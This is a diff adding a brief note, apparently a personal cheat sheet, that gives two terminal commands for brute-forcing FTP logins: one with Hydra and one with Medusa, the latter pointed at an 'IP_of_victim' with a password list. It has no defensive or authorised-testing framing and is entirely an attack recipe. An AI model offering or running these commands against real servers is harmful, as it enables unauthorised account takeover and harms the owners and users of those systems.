@@ -1,0 +1,11 @@
+1)using hydra::::
+        
+     :::in terminal:::
+           
+             hydra -l username -P password_file ftp://IP_address
+
+2)using medusa ::::
+       
+    :::in terminal:::
+         
+           medusa -h IP_of_victim -u username_here -P passlist.txt -M ftp
